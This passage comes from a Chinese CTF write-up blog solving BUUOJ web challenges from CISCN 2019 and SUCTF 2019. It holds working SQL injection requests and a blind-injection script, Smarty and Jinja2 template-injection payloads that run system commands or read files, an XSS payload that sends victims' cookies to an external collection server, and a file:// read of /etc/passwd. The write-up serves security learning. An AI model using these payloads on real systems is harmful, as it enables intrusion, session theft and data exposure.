class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。</p>
<p>因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/confirm.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 105</span><br><span class="line"><span class="attribute">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/change.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 29</span><br><span class="line"><span class="attribute">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>

<p>回显数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">errorXPATH syntax error: &#39;flag&#123;e9485017-ebf4-4ea4-8579-daa&#39;</span><br></pre></td></tr></table></figure>

<p>显示不全，再逆向输出一下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/confirm.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 114</span><br><span class="line"><span class="attribute">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/change.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 29</span><br><span class="line"><span class="attribute">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>

<p>输出内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">errorXPATH syntax error: &#39;</span><br><span class="line">&#125;6e91d8479aad-9758-4ae4-4fbe-71&#39;</span><br></pre></td></tr></table></figure>

<p>拼接即可</p>
<h2 id="华东南赛区-Web11"><a href="#华东南赛区-Web11" class="headerlink" title="华东南赛区 Web11"></a>华东南赛区 Web11</h2><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">关于SSTI</a></p>
<p>打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For</p>
<p><img src="/pic/94.png" alt=""></p>
<p>可能存在SSTI，测试一下的确存在SSTI</p>
<p><img src="/pic/96.png" alt=""></p>
<p>在网页的最下方发现了<strong>Build With Smarty</strong> </p>
<p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30</p>
<p><img src="/pic/97.png" alt=""></p>
<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了</p>
<p><img src="/pic/98.png" alt=""></p>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
<p>那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>有一个<a href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl" target="_blank" rel="noopener">{if}标签</a>可以使用</p>
<p>marty的<code>{if}</code>条件判断和PHP的<a href="http://php.net/if" target="_blank" rel="noopener">if</a> 非常相似，只是增加了一些特性。 每个<code>{if}</code>必须有一个配对的<code>{/if}</code>. 也可以使用<code>{else}</code> 和 <code>{elseif}</code>. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, <em>or</em>, <em>&amp;&amp;</em>, <em>and</em>, <em>is_array()</em>, 等等.</p>
<p>将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo</p>
<p><img src="/pic/99.png" alt=""></p>
<p>{if system(‘cat /flag’)}{/if}即可获取到flag</p>
<p><a href="https://www.jianshu.com/p/eb8d0137a7d3" target="_blank" rel="noopener">参考链接</a></p>
<h2 id="华东北赛区-Web2"><a href="#华东北赛区-Web2" class="headerlink" title="华东北赛区 Web2"></a>华东北赛区 Web2</h2><p>使用御剑扫描发现login.php，admin.php</p>
<p><img src="/pic/100.png" alt=""></p>
<p>访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿</p>
<p><img src="/pic/101.png" alt=""></p>
<p>明显的提示这题是XSS</p>
<p>提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。</p>
<p>来自赵师傅的payload     svg标签 ：xml自动解析html实体编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_str = <span class="string">"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=dzWPkK&amp;keepsession=0&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return''&#125;&#125;)());&#125;)();"</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c in in_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>

<p>得到地址后去commitbug.php（反馈）页面提交url</p>
<p><img src="/pic/102.png" alt=""></p>
<p>url中要将*.buuoj.cn改成web</p>
<p>附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">0</span>;substr(md5($a),<span class="number">0</span>,<span class="number">6</span>)!=<span class="string">'2ccf73'</span>;$a++)&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> md5($a);</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">'%09'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"> <span class="comment">//2ccf731c402b81796327fb7a4c5cd943	225315</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>去xss平台收cookie</p>
<p><img src="/pic/103.png" alt=""></p>
<p>修改cookie为收到的cookie，访问admin.php   存在sql注入</p>
<p><img src="/pic/104.png" alt="">)<img src="/pic/105.png" alt=""></p>
<p>编写注入脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2/19/2020 12:34 AM</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    print(hexs)</span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('</span>+payload+<span class="string">')'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    html = requests.get(url,cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'e7f4c1e48fd638f2a517cbe6d0a81857'</span>&#125;)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'不能查询管理员哦'</span>  <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">(db)</span>:</span></span><br><span class="line">    db=str2hex(db)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class="string">')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    table = str2hex(table)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class="string">')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #ciscn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tables('ciscn') #flag,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_columns('flag') #flagg</span></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'flagg'</span>,<span class="string">'flag'</span>) <span class="comment">#flag&#123;88331b80-7fb8-4f2f-9fa1-a4b85bd8562d&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="华东南赛区-Double-Secret"><a href="#华东南赛区-Double-Secret" class="headerlink" title="华东南赛区 Double Secret"></a>华东南赛区 Double Secret</h2><p>打卡题目的提示是:<code>Welcome To Find Secret</code></p>
<p>使用御剑扫一下目录，扫描到robots.txt</p>
<p>内容是: <code>It is Android ctf</code></p>
<p>尝试范围/secret  提示<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>传入参数?secret=123456789后报错</p>
<p><img src="/pic/106.png" alt=""></p>
<p>发现是flask框架，点开/app/app.py后有如下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">File <span class="string">"/app/app.py"</span>, line <span class="number">35</span>, <span class="keyword">in</span> secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Tell me your secret.I will encrypt it so others can\'t see'</span></span><br><span class="line"></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">"HereIsTreasure"</span>)   <span class="comment">#解密</span></span><br><span class="line"></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> [Open an interactive python shell <span class="keyword">in</span> this frame]  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ciscn'</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">python</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'flag detected!'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>是RC4加密，RC4算法加密又是解密将payload加密就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2/25/2020 11:38 PM</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_S_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.Box[i]) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % <span class="number">256</span></span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret="</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd = <span class="string">"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">print(payload)</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ciscn2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录11-SUCTF2019web复现</title>
    <url>/2020/02/04/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9511-SUCTF2019web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><ul>
<li><p>2019 usa black hat一个议题  <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">会议pdf</a></p>
<p><img src="/pic/67" alt=""></p>
</li>
<li><p>关于<a href="https://datatracker.ietf.org/doc/rfc5891/" target="_blank" rel="noopener">idna编码</a>   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u</p>
</li>
<li><p>CVE-2019-9636  : urlsplit不处理NFKC标准化   </p>
</li>
</ul>
<a id="more"></a>

<p>题目给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname   <span class="comment">#返回netloc部分</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<p><em>parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：<code>scheme://netloc/path;parameters?query#fragment</code></em></p>
<p>大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码</p>
<p>题目标题是pythonginx，提示nginx，nginx文件路径如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">网站配置文件：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>



<p><strong>非预期解</strong></p>
<p>以下是urlsplit函数源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>

<p>这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。</p>
<p>也就是<code>scheme:////netloc/path;parameters?query#fragment</code>经过urlsplite处理后会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scheme&#x3D;&#39;scheme&#39;, netloc&#x3D;&#39;&#39;, path&#x3D;&#39;&#x2F;&#x2F;netloc&#x2F;path;parameters&#39;, query&#x3D;&#39;query&#39;, fragment&#x3D;&#39;fragment&#39;</span><br></pre></td></tr></table></figure>

<p>再经过urlunsplit处理后会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scheme:&#x2F;&#x2F;netloc&#x2F;path;parameters?query#fragment</span><br></pre></td></tr></table></figure>

<p>如果传入的url是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>会返回主机的用户记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:*:17647:0:99999:7:::</span><br><span class="line">daemon:*:17647:0:99999:7:::</span><br><span class="line">bin:*:17647:0:99999:7:::</span><br><span class="line">sys:*:17647:0:99999:7:::</span><br><span class="line">sync:*:17647:0:99999:7:::</span><br><span class="line">games:*:17647:0:99999:7:::</span><br><span class="line">man:*:17647:0:99999:7:::</span><br><span class="line">lp:*:17647:0:99999:7:::</span><br><span class="line">mail:*:17647:0:99999:7:::</span><br><span class="line">news:*:17647:0:99999:7:::</span><br><span class="line">uucp:*:17647:0:99999:7:::</span><br><span class="line">proxy:*:17647:0:99999:7:::</span><br><span class="line">www-data:*:17647:0:99999:7:::</span><br><span class="line">backup:*:17647:0:99999:7:::</span><br><span class="line">list:*:17647:0:99999:7:::</span><br><span class="line">irc:*:17647:0:99999:7:::</span><br><span class="line">gnats:*:17647:0:99999:7:::</span><br><span class="line">nobody:*:17647:0:99999:7:::</span><br><span class="line">_apt:*:17647:0:99999:7:::</span><br><span class="line">nginx:!:17708:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>查看配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<p><img src="/pic/66" alt=""></p>
<p>查看网站配置文件</p>
